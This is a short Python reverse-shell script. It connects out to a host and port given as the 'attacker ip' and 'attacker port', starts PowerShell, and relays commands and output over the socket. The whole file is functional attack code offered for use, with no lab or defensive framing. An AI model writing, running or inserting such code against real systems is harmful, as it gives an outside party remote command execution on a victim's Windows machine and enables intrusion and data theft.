#!/usr/bin/python3

import sys
import socket
import threading
import subprocess

def recv():
	while 1:
		data = sock.recv(1024)
		if data:
			proc.stdin.write(data)
			proc.stdin.flush()

def send():
	while 1:
		if sock.send(proc.stdout.read(1)) <= 0: break

if __name__ == '__main__':
	if len(sys.argv) < 3 or "-h" in sys.argv or "--help" in sys.argv:
		print(f"Usage: {sys.argv[0]} <attacker ip> <attacker port>")
		exit()

	ip = sys.argv[1]
	port = sys.argv[2]

	sock = socket.socket()
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.connect((ip, int(port)))

	proc = subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
	threading.Thread(target=recv, daemon=1).start()
	send()